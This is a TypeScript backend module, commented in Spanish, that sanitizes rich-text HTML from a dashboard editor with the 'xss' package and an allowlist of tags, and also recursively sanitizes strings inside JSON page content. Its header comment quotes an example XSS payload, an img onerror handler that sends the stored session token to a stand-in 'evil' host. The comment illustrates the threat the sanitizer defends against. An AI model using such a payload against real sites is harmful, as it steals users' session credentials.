import { filterXSS, IFilterXSSOptions } from "xss";

// El editor de texto enriquecido del dashboard (RichTextEditor.tsx) guarda su salida como HTML
// crudo (contentEditable + document.execCommand) directamente en ProjectPage.content y en
// CustomPage.content (plantilla "nota") — sin esto, ese HTML se reenvía tal cual a cualquiera que
// lo abra y se vuelca sin escapar en `innerHTML` (ver RichTextEditor.tsx), así que un
// `<img src=x onerror="fetch('https://evil/?c='+localStorage.getItem('life-organizer:auth'))">`
// pegado en una nota se ejecutaría con acceso de lectura al token de sesión guardado ahí. Sanea
// aquí, en el único punto por el que pasan TODOS los caminos de escritura (API REST normal +
// sync offline del móvil, ver projectsService.ts/customPagesService.ts), en vez de confiar en que
// cada cliente sanee antes de mandarlo.
//
// Usa el paquete `xss` (CommonJS puro) y no `sanitize-html`: `sanitize-html` depende de
// htmlparser2@12, que es ESM-only ("type": "module", sin build CJS) — funciona por la
// interoperabilidad require(ESM) de Node en `ts-node-dev`, pero rompe bajo Jest ("Cannot use
// import statement outside a module" al testear cualquier cosa que importe projectsService.ts),
// así que no es una base fiable para el backend.
//
// El allowlist cubre exactamente lo que produce el propio editor (ver el comentario de cabecera
// de RichTextEditor.tsx): títulos, texto con formato, listas (incluida la de tareas, que es HTML
// con clases, no <input type=checkbox>), cita, callout, bloque de código, tabla, columnas,
// ecuaciones KaTeX (el wrapper contenteditable=false con data-latex) y tarjetas de enlace — nunca
// <script>, <iframe>, atributos on* ni esquemas javascript:/vbscript: (el propio filtro de `xss`
// los quita de cualquier atributo de tipo URL, como href/src).
const GLOBAL_ATTRS = ["class", "style", "data-latex", "contenteditable"];
const TABLE_CELL_ATTRS = [...GLOBAL_ATTRS, "colspan", "rowspan"];

const RICH_TEXT_OPTIONS: IFilterXSSOptions = {
  whiteList: {
    h1: GLOBAL_ATTRS, h2: GLOBAL_ATTRS, h3: GLOBAL_ATTRS,
    p: GLOBAL_ATTRS, br: GLOBAL_ATTRS, div: GLOBAL_ATTRS, span: GLOBAL_ATTRS,
    strong: GLOBAL_ATTRS, b: GLOBAL_ATTRS, em: GLOBAL_ATTRS, i: GLOBAL_ATTRS, u: GLOBAL_ATTRS, s: GLOBAL_ATTRS, strike: GLOBAL_ATTRS,
    ul: GLOBAL_ATTRS, ol: GLOBAL_ATTRS, li: GLOBAL_ATTRS, blockquote: GLOBAL_ATTRS, pre: GLOBAL_ATTRS, code: GLOBAL_ATTRS, hr: GLOBAL_ATTRS,
    table: GLOBAL_ATTRS, thead: GLOBAL_ATTRS, tbody: GLOBAL_ATTRS, tr: GLOBAL_ATTRS,
    td: TABLE_CELL_ATTRS, th: TABLE_CELL_ATTRS,
    a: [...GLOBAL_ATTRS, "href", "target", "rel"],
    img: [...GLOBAL_ATTRS, "src", "alt"],
  },
  // Sin esto, cualquier etiqueta fuera del whiteList (script, iframe, svg, form...) se queda solo
  // sin las etiquetas pero conserva su CONTENIDO de texto suelto en medio del documento — con
  // `stripIgnoreTagBody: true` desaparece entera, cuerpo incluido.
  stripIgnoreTagBody: true,
  allowCommentTag: false,
};

export function sanitizeRichTextHtml(html: string): string {
  return filterXSS(html, RICH_TEXT_OPTIONS);
}

// Las páginas personalizadas guardan `content` como JSON cuya forma depende de la plantilla
// (kanban, galería, finanzas...) — en vez de mantener una lista aparte de "qué campo de qué
// plantilla es HTML" (que se desincroniza en cuanto se añade una plantilla o un campo nuevo),
// sanea CUALQUIER string dentro del JSON: para un string que no es HTML (un título, un id...)
// sanitizeRichTextHtml es un no-op (no hay etiquetas que quitar), así que es seguro aplicarlo a
// ciegas a todo el árbol.
export function sanitizeJsonHtmlStrings<T>(value: T): T {
  if (typeof value === "string") {
    return sanitizeRichTextHtml(value) as unknown as T;
  }
  if (Array.isArray(value)) {
    return value.map((item) => sanitizeJsonHtmlStrings(item)) as unknown as T;
  }
  if (value && typeof value === "object") {
    const result: Record<string, unknown> = {};
    for (const [key, val] of Object.entries(value as Record<string, unknown>)) {
      result[key] = sanitizeJsonHtmlStrings(val);
    }
    return result as T;
  }
  return value;
}
